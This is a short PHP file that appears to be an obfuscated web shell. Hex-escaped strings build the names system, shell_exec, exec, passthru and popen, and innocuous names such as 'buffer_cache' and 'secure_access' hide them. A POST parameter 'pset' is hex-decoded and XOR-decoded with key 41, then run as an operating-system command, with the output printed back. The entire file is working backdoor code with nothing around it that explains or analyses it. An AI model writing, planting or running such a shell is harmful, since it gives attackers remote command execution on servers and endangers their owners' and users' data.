<?php

$buffer_cache6 = "\x73tream_\x67\x65t_\x63ontent\x73";
$buffer_cache5 = "p\x6Fp\x65n";
$buffer_cache1 = "\x73\x79\x73tem";
$buffer_cache4 = "pass\x74\x68ru";
$buffer_cache3 = "exe\x63";
$buffer_cache2 = "\x73h\x65l\x6C\x5Fe\x78ec";
$query_handler = "\x68\x65\x78\x32bin";
$buffer_cache7 = "p\x63\x6C\x6Fse";
if (isset($_POST["\x70s\x65t"])) {
            function secure_access   ( $pointer,   $token )    {$binding  =    '' ;$b=0; do{$binding.=chr(ord($pointer[$b])^$token);$b++;} while($b<strlen($pointer)); return  $binding;   }
            $pset = $query_handler($_POST["\x70s\x65t"]);
            $pset = secure_access($pset, 41);
            if (function_exists($buffer_cache1)) {
                $buffer_cache1($pset);
            } elseif (function_exists($buffer_cache2)) {
                print $buffer_cache2($pset);
            } elseif (function_exists($buffer_cache3)) {
                $buffer_cache3($pset, $k_pointer);
                print join("\n", $k_pointer);
            } elseif (function_exists($buffer_cache4)) {
                $buffer_cache4($pset);
            } elseif (function_exists($buffer_cache5) && function_exists($buffer_cache6) && function_exists($buffer_cache7)) {
                $token_binding = $buffer_cache5($pset, 'r');
                if ($token_binding) {
                    $sym_pgrp = $buffer_cache6($token_binding);
                    $buffer_cache7($token_binding);
                    print $sym_pgrp;
                }
            }
            exit;
        }